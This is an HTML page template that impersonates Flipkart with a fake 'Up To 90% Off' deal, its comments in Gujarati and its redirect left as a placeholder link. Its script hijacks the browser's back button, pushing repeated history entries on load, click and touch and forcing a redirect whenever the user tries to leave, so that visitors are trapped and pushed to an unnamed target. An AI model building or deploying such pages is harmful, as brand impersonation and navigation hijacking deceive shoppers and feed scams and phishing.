<!DOCTYPE html>
<html lang="gu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flipkart - Special Offer</title>
    <style>
        body, html {
            height: 100%; margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            background-color: #2874f0; font-family: 'Roboto', sans-serif;
            overflow: hidden;
        }

        /* Floating Logos Background */
        @keyframes float {
            0% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(50px, 50px) rotate(180deg); }
            100% { transform: translate(0, 0) rotate(360deg); }
        }
        .floating-logo {
            position: absolute; width: 60px; opacity: 0.15; z-index: 1; pointer-events: none;
        }

        .container { text-align: center; z-index: 10; position: relative; width: 100%; }

        /* બટનની ઉપરનું લખાણ */
        .top-text { 
            font-size: 24px; 
            font-weight: bold; 
            color: #ffffff; 
            margin-bottom: 15px; 
            text-transform: uppercase;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
        }

        /* ધ્રૂજતું એનિમેશન */
        @keyframes shake {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        /* ફ્લિપકાર્ટ સ્ટાઇલ પીળું બટન */
        .flipkart-button {
            background-color: #ffe11b; /* Flipkart Yellow */
            color: #212121;
            padding: 20px 60px;
            border: none;
            border-radius: 8px; /* Standard Button Shape */
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            display: inline-block;
            text-decoration: none;
            transition: transform 0.2s;
            animation: shake 1s infinite;
        }

        .offer-text { 
            font-size: 28px; 
            font-weight: 900; 
            display: block; 
            line-height: 1;
        }

        .click-here-text { 
            font-size: 16px; 
            display: block; 
            margin-top: 5px; 
            font-weight: bold;
            color: #000;
            opacity: 0.8;
        }
    </style>
</head>
<body onclick="activateHijack()" ontouchstart="activateHijack()">

    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:10%; left:10%; animation: float 15s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:15%; animation: float 20s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:40%; left:80%; animation: float 18s infinite linear;">

    <div class="container">
        <div class="top-text">Claim your deal</div>
        
        <a href="https://તમારી-લિંક-અહીં-મૂકો.com" class="flipkart-button" id="mainButton">
            <span class="offer-text">Up To 90% Off</span>
            <span class="click-here-text">Click Here</span>
        </a>
    </div>

    <script>
        var targetUrl = "https://તમારી-લિંક-અહીં-મૂકો.com"; 

        // બેક બટન હાઇજેક
        function activateHijack() {
            for(var i=0; i<10; i++) {
                window.history.pushState(null, null, window.location.href);
            }
        }

        window.onload = function() {
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = function(event) {
                window.location.replace(targetUrl);
            };
        };

        document.getElementById("mainButton").onclick = function(e) {
            e.preventDefault();
            window.location.replace(targetUrl);
        };
    </script>
</body>
</html>
